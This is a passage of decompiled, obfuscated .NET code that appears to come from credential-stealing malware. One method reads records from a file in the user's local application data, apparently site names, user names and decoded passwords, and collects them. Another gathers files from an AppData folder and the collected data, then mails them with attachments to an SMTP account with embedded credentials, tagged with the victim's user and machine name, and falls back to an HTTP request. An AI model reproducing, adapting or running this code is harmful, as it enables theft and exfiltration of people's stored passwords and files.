            str7 = string.Concat(strArray1);
          }
          else
          {
            strArray1 = new string[5]
            {
              \u0007.\u0001(\u000E.\u0003.\u0001(4794), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(5038), \u000E.\u0003.\u0001(55)),
              Environment.NewLine,
              \u0007.\u0001(\u000E.\u0003.\u0001(4977), \u000E.\u0003.\u0001(55))
            };
            str7 = string.Concat(strArray1);
          }
          \u000E.\u0001.\u0011 = str7;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u000E.\u0001.\u0011 = \u000E.\u0003.\u0001(13);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str13 = str7;
        string str14 = str6;
        string str15 = str2;
        string str16 = str3;
        string str17 = str1;
        string str18 = str4;
        string str19 = str5;
        string str20 = Left;
        string[] strArray2 = strArray1;
        \u0007.\u0001(ex, (object) str13, (object) str14, (object) str15, (object) str16, (object) str17, (object) str18, (object) str19, (object) str20, (object) strArray2);
        throw;
      }
    }

    static unsafe void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int num1;
      int index1;
      int[] numArray1;
      int index2;
      int num2;
      int num3;
      int[] numArray2;
      int[] numArray3;
      int num4;
      int index3;
      int index4;
      int index5;
      int num5;
      try
      {
        *(int*) voidPtr = obj0.\u0001.Length;
        numArray1 = new int[*(int*) voidPtr];
        num1 = 0;
        num2 = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
        {
          *(int*) ((IntPtr) voidPtr + 8) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            for (index1 = num1++; index1 > 0 && (int) obj0.\u0001[numArray1[index2 = (index1 - 1) / 2]] > *(int*) ((IntPtr) voidPtr + 8); index1 = index2)
              numArray1[index1] = numArray1[index2];
            numArray1[index1] = *(int*) ((IntPtr) voidPtr + 4);
            num2 = *(int*) ((IntPtr) voidPtr + 4);
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        for (; num1 < 2; numArray1[num1++] = num3)
        {
          int num6;
          if (num2 >= 2)
            num6 = 0;
          else
            num2 = num6 = num2 + 1;
          num3 = num6;
        }
        obj0.\u0002 = Math.Max(num2 + 1, obj0.\u0001);
        *(int*) ((IntPtr) voidPtr + 12) = num1;
        int num7 = 4 * num1;
        if (true)
        {
          numArray2 = new int[num7 - 2];
          numArray3 = new int[2 * num1 - 1];
          num4 = *(int*) ((IntPtr) voidPtr + 12);
          *(int*) ((IntPtr) voidPtr + 16) = 0;
          while (*(int*) ((IntPtr) voidPtr + 16) < num1)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 20);
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] = -1;
            numArray3[*(int*) ((IntPtr) voidPtr + 16)] = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 20)] << 8;
            numArray1[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 16);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
          }
        }
        else
          goto label_25;
label_17:
        *(int*) ((IntPtr) voidPtr + 24) = numArray1[0];
        index3 = numArray1[--num1];
        index4 = 0;
        for (index5 = 1; index5 < num1; index5 = index5 * 2 + 1)
        {
          if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
            ++index5;
          numArray1[index4] = numArray1[index5];
          index4 = index5;
        }
        num5 = numArray3[index3];
label_24:
        num7 = index5 = index4;
label_25:
        if (num7 > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
        {
          numArray1[index5] = numArray1[index4];
          goto label_24;
        }
        else
        {
          numArray1[index5] = index3;
          *(int*) ((IntPtr) voidPtr + 28) = numArray1[0];
          index3 = num4++;
          numArray2[2 * index3] = *(int*) ((IntPtr) voidPtr + 24);
          numArray2[2 * index3 + 1] = *(int*) ((IntPtr) voidPtr + 28);
          *(int*) ((IntPtr) voidPtr + 32) = Math.Min(numArray3[*(int*) ((IntPtr) voidPtr + 24)] & (int) byte.MaxValue, numArray3[*(int*) ((IntPtr) voidPtr + 28)] & (int) byte.MaxValue);
          numArray3[index3] = num5 = numArray3[*(int*) ((IntPtr) voidPtr + 24)] + numArray3[*(int*) ((IntPtr) voidPtr + 28)] - *(int*) ((IntPtr) voidPtr + 32) + 1;
          index4 = 0;
          for (index5 = 1; index5 < num1; index5 = index4 * 2 + 1)
          {
            if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
              ++index5;
            numArray1[index4] = numArray1[index5];
            index4 = index5;
          }
          while ((index5 = index4) > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
            numArray1[index5] = numArray1[index4];
          numArray1[index5] = index3;
          if (num1 <= 1)
            \u0007.\u0001(obj0, numArray2);
          else
            goto label_17;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) *(int*) voidPtr,
          (object) numArray1,
          (object) num1,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) index1,
          (object) index2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray2,
          (object) numArray3,
          (object) num4,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) index3,
          (object) index4,
          (object) index5,
          (object) num5,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) obj0
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetSystemInfo")]
    static extern void \u0001([In] ref \u0003.\u0004.\u0002 obj0);

    [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
    static void \u0001([In] \u0005.\u0006 obj0)
    {
      if (obj0 == null)
        return;
      if (true)
        \u0005.\u0006.\u0001 = obj0;
      // ISSUE: method pointer
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler((object) obj0, __methodptr(\u0001));
      // ISSUE: method pointer
      Application.ThreadException += new ThreadExceptionEventHandler((object) obj0, __methodptr(\u0001));
    }

    static int \u0001([In] \u000F.\u0006.\u000F obj0)
    {
      int num1;
      try
      {
        if (true)
        {
          int num2 = obj0.ReadByte();
          int num3;
          while (true)
          {
            int num4 = obj0.ReadByte();
            int num5;
            while (true)
            {
              num5 = num4 << 8;
              if (false)
                num4 = num5;
              else
                break;
            }
            num3 = num2 | num5;
            if (false)
              num2 = num3;
            else
              break;
          }
          num1 = num3;
        }
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u000F obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static System.Type \u0001([In] \u000E.\u0005 obj0) => obj0.\u0001;

    static unsafe bool \u0001([In] bool obj0, [In] \u000F.\u0006.\u0008 obj1, [In] bool obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(29);
      int num1;
      bool flag;
      try
      {
        if (obj1.\u0006 >= 262 || obj2)
        {
          while (obj1.\u0006 >= 262 || obj2)
          {
            if (obj1.\u0006 != 0)
            {
              if (obj1.\u0005 >= 65274)
                \u0007.\u0001(obj1);
              *(int*) voidPtr = obj1.\u0002;
              num1 = obj1.\u0003;
              if (obj1.\u0006 >= 3)
              {
                *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj1);
                if (*(int*) ((IntPtr) voidPtr + 4) != 0 && obj1.\u0005 - *(int*) ((IntPtr) voidPtr + 4) <= 32506 && \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj1) && obj1.\u0003 <= 5 && obj1.\u0003 == 3 && obj1.\u0005 - obj1.\u0002 > 4096)
                  obj1.\u0003 = 2;
              }
              if (num1 >= 3 && obj1.\u0003 <= num1)
              {
                \u000F.\u0006.\u0007 obj = obj1.\u0001;
                *(int*) ((IntPtr) voidPtr + 20) = obj1.\u0005 - 1 - *(int*) voidPtr;
                \u0007.\u0001(num1, obj, *(int*) ((IntPtr) voidPtr + 20));
                num1 -= 2;
                do
                {
                  ++obj1.\u0005;
                  --obj1.\u0006;
                  if (obj1.\u0006 >= 3)
                  {
                    if (true)
                      \u0007.\u0001(obj1);
                    else
                      goto label_23;
                  }
                }
                while (--num1 > 0);
                ++obj1.\u0005;
                --obj1.\u0006;
                obj1.\u0001 = false;
                obj1.\u0003 = 2;
              }
              else
              {
                if (obj1.\u0001)
                {
                  \u000F.\u0006.\u0007 obj = obj1.\u0001;
                  *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[obj1.\u0005 - 1] & (int) byte.MaxValue;
                  \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 16), obj);
                }
                obj1.\u0001 = true;
                ++obj1.\u0005;
                --obj1.\u0006;
              }
              int num2;
              if (\u0007.\u0001(obj1.\u0001))
              {
                *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0005 - obj1.\u0004;
                if (obj1.\u0001)
                  *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - 1;
                if (obj0 && obj1.\u0006 == 0)
                {
                  num2 = !obj1.\u0001 ? 1 : 0;
                  goto label_24;
                }
              }
              else
                continue;
label_23:
              num2 = 0;
label_24:
              flag = num2 != 0;
              \u000F.\u0006.\u0007 obj3 = obj1.\u0001;
              byte[] numArray = obj1.\u0001;
              *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0004;
              \u0007.\u0001(flag, *(int*) ((IntPtr) voidPtr + 8), numArray, *(int*) ((IntPtr) voidPtr + 12), obj3);
              obj1.\u0004 += *(int*) ((IntPtr) voidPtr + 8);
              *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) !flag;
              goto label_32;
            }
            else
            {
              if (obj1.\u0001)
                goto label_30;
label_2:
              obj1.\u0001 = false;
              \u000F.\u0006.\u0007 obj4 = obj1.\u0001;
              byte[] numArray = obj1.\u0001;
              *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0004;
              *(int*) ((IntPtr) voidPtr + 24) = obj1.\u0005 - obj1.\u0004;
              \u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 24), numArray, *(int*) ((IntPtr) voidPtr + 12), obj4);
              obj1.\u0004 = obj1.\u0005;
              *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 0;
              goto label_32;
label_30:
              \u000F.\u0006.\u0007 obj5 = obj1.\u0001;
              *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[obj1.\u0005 - 1] & (int) byte.MaxValue;
              \u0007.\u0001(*(int*) ((IntPtr) voidPtr + 16), obj5);
              goto label_2;
            }
          }
          *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 1;
        }
        else
          *(sbyte*) ((IntPtr) voidPtr + 28) = (sbyte) 0;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<bool> local5 = (ValueType) flag;
        \u000F.\u0006.\u0008 obj = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local6 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local7 = (ValueType) obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) obj, (object) local6, (object) local7);
        throw;
      }
label_32:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 28);
    }

    static string \u0001()
    {
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u0007.\u0001()) ?? Registry.LocalMachine.OpenSubKey(\u0007.\u0001());
        if (registryKey == null)
          return (string) null;
        string str = (string) registryKey.GetValue(\u000E.\u0003.\u0001(5083), (object) null);
        registryKey.Close();
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static unsafe void \u0001([In] \u000F.\u0006.\u0007.\u0001 obj0, [In] \u000F.\u0006.\u0007.\u0001 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int num1;
      try
      {
        if (true)
          goto label_26;
label_14:
        int num2 = num1;
        int num3 = num2 - 1;
label_15:
        num1 = num3;
        if (num2 > 0)
        {
          \u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 8));
          goto label_14;
        }
label_24:
        while (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002)
        {
label_2:
          num1 = 1;
          *(int*) ((IntPtr) voidPtr + 16) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
          if (false)
            goto label_5;
          else
            goto label_28;
label_4:
          if (*(int*) ((IntPtr) voidPtr + 8) == *(int*) ((IntPtr) voidPtr + 16))
            goto label_6;
label_5:
          \u0007.\u0001(obj0, *(int*) ((IntPtr) voidPtr + 16));
          num1 = 0;
label_6:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 16);
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
          int num4;
          int num5;
          do
          {
            if (true)
            {
              do
              {
                if (*(int*) ((IntPtr) voidPtr + 12) < obj1.\u0002 && *(int*) ((IntPtr) voidPtr + 8) == (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 12)])
                {
                  *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
                  num4 = num1;
                  num5 = 1;
                  if (num5 == 0)
                    goto label_31;
                }
                else
                  break;
              }
              while ((num1 = num4 + num5) < *(int*) voidPtr);
            }
            else
              goto label_2;
          }
          while (false);
          if (num1 >= *(int*) ((IntPtr) voidPtr + 4))
          {
            if (*(int*) ((IntPtr) voidPtr + 8) != 0)
              \u0007.\u0001(obj0, 16);
            else
              goto label_19;
label_18:
            \u0007.\u0001(obj1.\u0001.\u0001, num1 - 3, 2);
            continue;
label_19:
            if (true)
            {
              if (true)
              {
                if (num1 <= 10)
                {
                  \u0007.\u0001(obj0, 17);
                  \u0007.\u0001(obj1.\u0001.\u0001, num1 - 3, 3);
                  continue;
                }
                \u0007.\u0001(obj0, 18);
                \u0007.\u0001(obj1.\u0001.\u0001, num1 - 11, 7);
                continue;
              }
              goto label_18;
            }
            else
              goto label_4;
          }
          else
            goto label_14;
label_31:
          num3 = num5;
          num2 = num4;
          goto label_15;
label_28:
          if (*(int*) ((IntPtr) voidPtr + 16) != 0)
          {
            *(int*) voidPtr = 6;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_4;
          }
          else
          {
            *(int*) voidPtr = 138;
            *(int*) ((IntPtr) voidPtr + 4) = 3;
            goto label_6;
          }
        }
        return;
label_26:
        *(int*) ((IntPtr) voidPtr + 8) = -1;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 12) = 0;
          goto label_24;
        }
        else
          goto label_14;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        // ISSUE: variable of a boxed type
        __Boxed<int> local6 = (ValueType) *(int*) ((IntPtr) voidPtr + 16);
        \u000F.\u0006.\u0007.\u0001 obj2 = obj1;
        \u000F.\u0006.\u0007.\u0001 obj3 = obj0;
        \u0007.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) obj2, (object) obj3);
        throw;
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      DirectoryInfo directoryInfo;
      FileInfo[] files;
      string[] strArray;
      string Expression;
      MailMessage message;
      MailMessage mailMessage;
      FileInfo[] fileInfoArray;
      FileInfo fileInfo;
      Attachment attachment;
      SmtpClient smtpClient1;
      SmtpClient smtpClient2;
      string str;
      HttpWebResponse response;
      try
      {
        *(int*) ((IntPtr) voidPtr + 8) = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(175), \u0007.\u0001(\u000E.\u0003.\u0001(5092), \u000E.\u0003.\u0001(55)))).Length;
        directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(175), \u0007.\u0001(\u000E.\u0003.\u0001(5092), \u000E.\u0003.\u0001(55))));
        files = directoryInfo.GetFiles();
        *(int*) ((IntPtr) voidPtr + 12) = 0;
        try
        {
          *(double*) voidPtr = 25.0;
          \u0007.\u0001(ref *(double*) voidPtr);
          strArray = new string[40]
          {
            \u0007.\u0001(\u000E.\u0003.\u0001(5105), \u000E.\u0003.\u0001(55)),
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0001,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0002,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0003,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0004,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0005,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0006,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0007,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0008,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u000E,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u000F,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0010,
            Environment.NewLine,
            Environment.NewLine,
            \u000E.\u0001.\u0011,
            Environment.NewLine,
            Environment.NewLine,
            \u0007.\u0001(\u000E.\u0003.\u0001(5311), \u000E.\u0003.\u0001(55))
          };
          Expression = string.Concat(strArray);
          try
          {
            message = new MailMessage();
            mailMessage = message;
            mailMessage.From = new MailAddress(\u000E.\u0001.\u0013);
            mailMessage.To.Add(\u000E.\u0001.\u0013);
            mailMessage.Subject = \u0007.\u0001(\u000E.\u0003.\u0001(5545), \u000E.\u0003.\u0001(55)) + Environment.UserName.ToString() + \u0007.\u0001(\u000E.\u0003.\u0001(1479), \u0007.\u0001(\u000E.\u0003.\u0001(5092), \u000E.\u0003.\u0001(55))) + Environment.MachineName.ToString();
            mailMessage.Body = Expression;
            try
            {
              fileInfoArray = files;
              *(int*) ((IntPtr) voidPtr + 16) = 0;
              while (*(int*) ((IntPtr) voidPtr + 16) < fileInfoArray.Length)
              {
                fileInfo = fileInfoArray[*(int*) ((IntPtr) voidPtr + 16)];
                attachment = new Attachment(fileInfo.FullName);
                mailMessage.Attachments.Add(attachment);
                *(int*) ((IntPtr) voidPtr + 16) = checked (*(int*) unchecked ((IntPtr) voidPtr + 16) + 1);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            mailMessage = (MailMessage) null;
            smtpClient1 = new SmtpClient(\u000E.\u0001.\u0015);
            smtpClient2 = smtpClient1;
            smtpClient2.Port = \u000E.\u0001.\u0001;
            smtpClient2.EnableSsl = true;
            smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(\u000E.\u0001.\u0013, \u000E.\u0001.\u0014);
            smtpClient2.Send(message);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              str = \u0007.\u0001(\u000E.\u0003.\u0001(1488), \u000E.\u0003.\u0001(55));
              strArray = new string[9]
              {
                str,
                \u000E.\u0003.\u0001(1581),
                \u000E.\u0001.\u0013,
                \u000E.\u0003.\u0001(1590),
                Strings.Replace(\u0007.\u0001(\u000E.\u0003.\u0001(5545), \u000E.\u0003.\u0001(55)) + Environment.UserName.ToString() + \u0007.\u0001(\u000E.\u0003.\u0001(1479), \u0007.\u0001(\u000E.\u0003.\u0001(5092), \u000E.\u0003.\u0001(55))) + Environment.MachineName.ToString(), \u000E.\u0003.\u0001(1603), \u000E.\u0003.\u0001(1608)),
                \u000E.\u0003.\u0001(1613),
                Strings.Replace(Expression, \u000E.\u0003.\u0001(1603), \u000E.\u0003.\u0001(1608)),
                \u000E.\u0003.\u0001(1626),
                \u000E.\u0001.\u0013
              };
              response = (HttpWebResponse) WebRequest.Create(string.Concat(strArray)).GetResponse();
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[17]
        {
          (object) directoryInfo,
          (object) fileInfo,
          (object) files,
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) Expression,
          (object) smtpClient1,
          (object) message,
          (object) attachment,
          (object) str,
          (object) response,
          (object) *(double*) voidPtr,
          (object) strArray,
          (object) mailMessage,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) fileInfoArray,
          (object) smtpClient2
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static bool \u0001([In] \u000F.\u0006.\u0006 obj0)
    {
      bool flag;
      try
      {
        flag = \u0007.\u0001(obj0.\u0001);
      }
      catch (Exception ex)
      {
        \u000F.\u0006.\u0006 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
      return flag;
    }

    static void \u0001([In] \u000F.\u0005 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u000F.\u0005 obj = obj0;
        \u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

    static void \u0001([In] \u0005.\u0003 obj0, [In] \u0002.\u0003 obj1)
    {
      \u0004.\u0001 obj = obj1.\u0001;
      if (obj == null)
        return;
      obj((object) obj1, obj0);
    }

    static void \u0001([In] IWebProxy obj0, [In] \u0004.\u0003 obj1) => obj1.\u0001 = obj0;

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] \u000F.\u0006.\u0001 obj2, [In] byte[] obj3)
    {
      void* voidPtr;
      do
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(12);
        try
        {
          *(int*) voidPtr = 0;
label_11:
          do
          {
            if (obj2.\u0001 != 11)
              goto label_12;
label_6:
            do
            {
              if (!\u0007.\u0001(obj2))
              {
                if (\u0007.\u0001(obj2.\u0001) <= 0)
                  goto label_10;
              }
              else
                goto label_11;
            }
            while (false);
            continue;
label_12:
            *(int*) ((IntPtr) voidPtr + 4) = \u0007.\u0001(obj1, obj0, obj2.\u0001, obj3);
            do
            {
              obj1 += *(int*) ((IntPtr) voidPtr + 4);
              if (false)
                goto label_11;
            }
            while (false);
            *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
            obj0 -= *(int*) ((IntPtr) voidPtr + 4);
            if (obj0 != 0)
              goto label_6;
            else
              goto label_5;
          }
          while (obj2.\u0001 != 11);
          goto label_10;
label_5:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
          if (true)
            goto label_14;
label_10:
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
          \u000F.\u0006.\u0001 obj = obj2;
          byte[] numArray = obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj0;
          \u0007.\u0001(ex, (object) local1, (object) local2, (object) obj, (object) numArray, (object) local3, (object) local4);
          throw;
        }
label_14:;
      }
      while (false);
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static \u0003.\u0004.\u0001 \u0001()
    {
      if (!\u0003.\u0004.\u0001)
      {
        \u0003.\u0004.\u0001 = new \u0003.\u0004.\u0001();
        try
        {
          do
          {
            \u0003.\u0004.\u0001.\u0001 = Marshal.SizeOf(typeof (\u0003.\u0004.\u0001));
            do
            {
              int num = (int) \u0007.\u0001(ref \u0003.\u0004.\u0001);
            }
            while (false);
            \u0003.\u0004.\u0001 = true;
          }
          while (false);
        }
        catch
        {
        }
      }
      return \u0003.\u0004.\u0001;
    }

    static void \u0001()
    {
label_0:
      try
      {
        try
        {
          if (Environment.OSVersion.Platform != PlatformID.Win32NT)
            goto label_2;
label_1:
          if (true)
            MemoryManager.\u0001 = new MemoryManager();
          else
            goto label_0;
label_2:
          if (false)
            goto label_1;
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
        \u0007.\u0001(ex);
        throw;
      }
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(8);
      \u0003.\u0001 obj1;
      string path;
      string str1;
      string Left1;
      string Left2;
      string[] strArray1;
      Exception exception1;
      try
      {
        if (false)
          return;
        path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0007.\u0001(\u000E.\u0003.\u0001(5594), \u000E.\u0003.\u0001(55));
        try
        {
          obj1 = new \u0003.\u0001(path);
          \u0007.\u0001(\u0007.\u0001(\u000E.\u0003.\u0001(5675), \u000E.\u0003.\u0001(55)));
          if (!System.IO.File.Exists(path))
            return;
          void* voidPtr2 = voidPtr1;
          *(int*) ((IntPtr) voidPtr1 + 4) = checked (\u0007.\u0001() - 1);
          *(int*) voidPtr2 = 0;
          while (*(int*) voidPtr1 <= *(int*) ((IntPtr) voidPtr1 + 4))
          {
            str1 = \u0007.\u0001(*(int*) voidPtr1, \u0007.\u0001(\u000E.\u0003.\u0001(5692), \u000E.\u0003.\u0001(55)));
            Left1 = \u0007.\u0001(*(int*) voidPtr1, \u0007.\u0001(\u000E.\u0003.\u0001(5717), \u000E.\u0003.\u0001(55)));
            Left2 = \u0007.\u0001(Encoding.Default.GetBytes(\u0007.\u0001(*(int*) voidPtr1, \u0007.\u0001(\u000E.\u0003.\u0001(5746), \u000E.\u0003.\u0001(55)))));
            if (Operators.CompareString(Left1, \u000E.\u0003.\u0001(13), false) != 0 & Operators.CompareString(Left2, \u000E.\u0003.\u0001(13), false) != 0)
            {
              strArray1 = new string[13]
              {
                \u0007.\u0001(\u000E.\u0003.\u0001(5775), \u000E.\u0003.\u0001(55)),
                \u000E.\u0003.\u0001(2564),
                \u0007.\u0001(\u000E.\u0003.\u0001(5836), \u000E.\u0003.\u0001(55)),
                str1,
                \u000E.\u0003.\u0001(2564),
                \u0007.\u0001(\u000E.\u0003.\u0001(5853), \u000E.\u0003.\u0001(55)),
                Left1,
                \u000E.\u0003.\u0001(2564),
                \u0007.\u0001(\u000E.\u0003.\u0001(5878), \u000E.\u0003.\u0001(55)),
                Left2,
                \u000E.\u0003.\u0001(2564),
                \u0007.\u0001(\u000E.\u0003.\u0001(5903), \u000E.\u0003.\u0001(55)),
                \u000E.\u0003.\u0001(5960)
              };
              \u0006.\u0003.\u0001 = string.Concat(strArray1);
            }
            else
              goto label_10;
label_9:
            \u000E.\u0001.\u0001 += \u0006.\u0003.\u0001;
label_10:
            if (true)
              *(int*) voidPtr1 = checked (*(int*) voidPtr1 + 1);
            else
              goto label_9;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        string str2 = path;
        \u0003.\u0001 obj2 = obj1;
        string str3 = str1;
        string str4 = Left2;
        string str5 = Left1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr1;
        Exception exception2 = exception1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr1 + 4);
        string[] strArray2 = strArray1;
        \u0007.\u0001(ex, (object) str2, (object) obj2, (object) str3, (object) str4, (object) str5, (object) local1, (object) exception2, (object) local2, (object) strArray2);
        throw;
      }
    }

